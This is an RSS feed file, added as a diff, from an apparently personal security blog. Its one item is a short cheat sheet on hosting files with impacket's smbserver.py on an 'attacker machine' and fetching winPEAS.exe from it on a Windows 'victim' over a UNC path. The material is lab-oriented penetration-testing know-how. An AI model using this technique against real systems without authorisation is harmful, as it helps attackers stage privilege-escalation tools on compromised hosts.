@@ -1,0 +1,34 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Smb-Server on Gajendra Mahato</title>
+    <link>http://localhost:1313/tags/smb-server/</link>
+    <description>Recent content in Smb-Server on Gajendra Mahato</description>
+    <generator>Hugo -- 0.155.3</generator>
+    <language>en</language>
+    <lastBuildDate>Tue, 13 Jan 2026 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/smb-server/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>📁 File Sharing Over SMB Using `smbserver.py`</title>
+      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/smb-using-smbserver.py/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/smb-using-smbserver.py/</guid>
+      <description>&lt;hr&gt;
+&lt;h2 id=&#34;-on-the-linux-server-attacker-machine&#34;&gt;🖥️ On the Linux Server (Attacker Machine)&lt;/h2&gt;
+&lt;p&gt;Start an SMB server using &lt;code&gt;impacket-smbserver&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo smbserver.py gnu &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt; -smb2support
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;gnu&lt;/code&gt;: Share name&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;$(pwd)&lt;/code&gt;: Current working directory to be shared&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-smb2support&lt;/code&gt;: Enables SMB2 support for better compatibility with newer Windows systems&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;-on-the-windows-client-victim-machine&#34;&gt;🪟 On the Windows Client (Victim Machine)&lt;/h2&gt;
+&lt;p&gt;Access the shared file using UNC path:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;\\10.10.14.42\gnu\winPEAS.exe
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;🔸 Replace &lt;code&gt;10.10.14.42&lt;/code&gt; with the IP of your Linux (attacker) machine
+🔸 You can also map this as a network drive or copy files directly using &lt;code&gt;copy&lt;/code&gt; or &lt;code&gt;xcopy&lt;/code&gt; in CMD or PowerShell&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
